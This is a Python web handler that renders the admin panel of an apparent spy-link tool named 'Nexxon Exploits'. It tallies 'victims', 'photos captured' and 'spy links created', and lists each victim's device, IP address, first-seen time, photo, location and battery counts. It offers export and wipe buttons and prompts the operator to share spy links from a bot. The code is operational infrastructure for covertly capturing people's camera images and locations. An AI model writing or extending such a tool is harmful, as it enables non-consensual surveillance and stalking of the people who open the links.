import json
import os
import glob
from datetime import datetime
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from config import CONFIG

VISITORS_FILE = os.path.join(CONFIG['data_dir'], 'visitors.json')
LINKS_FILE = os.path.join(CONFIG['data_dir'], 'links.json')

def load_json(file_path):
    if not os.path.exists(file_path):
        return {}
    with open(file_path, 'r') as f:
        return json.load(f)

def save_json(file_path, data):
    with open(file_path, 'w') as f:
        json.dump(data, f)

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        params = parse_qs(parsed_path.query)
        
        # Handle actions
        if 'export' in params:
            visitors = load_json(VISITORS_FILE)
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Content-Disposition', f'attachment; filename="visitors_{datetime.now().strftime("%Y-%m-%d")}.json"')
            self.end_headers()
            self.wfile.write(json.dumps(visitors, indent=2).encode())
            return
        
        if 'clear' in params:
            save_json(VISITORS_FILE, {})
            save_json(LINKS_FILE, {})
            # Clean photos
            for photo in glob.glob(os.path.join(CONFIG['photos_dir'], '*.jpg')):
                try:
                    os.remove(photo)
                except:
                    pass
            
            self.send_response(302)
            self.send_header('Location', '/admin')
            self.end_headers()
            return
        
        # Load data for display
        visitors = load_json(VISITORS_FILE)
        links = load_json(LINKS_FILE)
        total_victims = len(visitors)
        
        total_photos = sum(v.get('photos', 0) for v in visitors.values())
        total_links = len(links)
        
        # Generate HTML
        html = f'''<!DOCTYPE html>
<html>
<head>
    <title>Admin - Nexxon Exploits</title>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{ background: #0f0c29; color: white; font-family: Arial; padding: 20px; }}
        .header {{ display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; }}
        .stats {{ display: flex; gap: 15px; flex-wrap: wrap; margin: 20px 0; }}
        .stat-box {{ background: rgba(255,255,255,0.05); padding: 18px 25px; border-radius: 15px; flex: 1; min-width: 100px; text-align: center; }}
        .stat-box h2 {{ font-size: 32px; color: #f7971e; }}
        .stat-box p {{ color: #888; font-size: 13px; }}
        .btn {{ background: #f7971e; color: black; padding: 8px 18px; border: none; border-radius: 10px; cursor: pointer; margin: 3px; font-weight: 600; text-decoration: none; display: inline-block; }}
        .btn:hover {{ background: #ffd200; }}
        .btn-danger {{ background: #ef4444; color: white; }}
        .visitor-card {{ background: rgba(255,255,255,0.03); border-radius: 15px; padding: 20px; margin: 15px 0; }}
        .visitor-card h3 {{ color: #f7971e; margin-bottom: 8px; }}
        .info {{ color: #aaa; font-size: 13px; margin: 4px 0; }}
        .badge {{ display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 12px; background: rgba(255,255,255,0.05); margin: 2px; }}
        .link-item {{ background: rgba(255,255,255,0.03); padding: 10px 15px; border-radius: 10px; margin: 5px 0; display: flex; justify-content: space-between; align-items: center; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>👾 Admin Panel - Nexxon Exploits</h1>
        <div>
            <a href="?export=json" class="btn">📥 Export</a>
            <a href="?clear=all" class="btn btn-danger" onclick="return confirm('Delete ALL data?')">🗑️ Clear</a>
        </div>
    </div>
    
    <div class="stats">
        <div class="stat-box"><h2>{total_victims}</h2><p>Total Victims</p></div>
        <div class="stat-box"><h2>{total_photos}</h2><p>Photos Captured</p></div>
        <div class="stat-box"><h2>{total_links}</h2><p>Spy Links Created</p></div>
    </div>

    <div style="margin:20px 0;">
        <h3>🔗 All Spy Links</h3>'''
        
        for code, data in links.items():
            html += f'''
            <div class="link-item">
                <span><strong>{code}</strong> → {data.get('url', 'N/A')}</span>
                <span style="color:#666;font-size:12px;">{data.get('created_at', 'N/A')}</span>
            </div>'''
        
        html += '''
    </div>

    <h3>📋 All Victims</h3>'''
        
        if not visitors:
            html += '''
        <div style="color:#666;text-align:center;padding:40px;">
            <h2>📭 No Victims Yet</h2>
            <p>Generate a spy link from your bot and share it!</p>
        </div>'''
        else:
            for vid, data in visitors.items():
                photos = data.get('photos', 0)
                locations = data.get('locations', 0)
                battery = data.get('battery', 0)
                
                html += f'''
            <div class="visitor-card">
                <h3>🆔 {vid}</h3>
                <div class="info"><strong>📱 Device:</strong> {data.get('device', 'Unknown')[:60]}</div>
                <div class="info"><strong>🌐 IP:</strong> {data.get('ip', 'Unknown')}</div>
                <div class="info"><strong>📅 First Seen:</strong> {data.get('time', 'N/A')}</div>
                <div class="info">
                    <strong>📊 Stats:</strong> 
                    <span class="badge">📸 {photos}</span>
                    <span class="badge">📍 {locations}</span>
                    <span class="badge">🔋 {battery}</span>
                </div>
            </div>'''
        
        html += '''
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
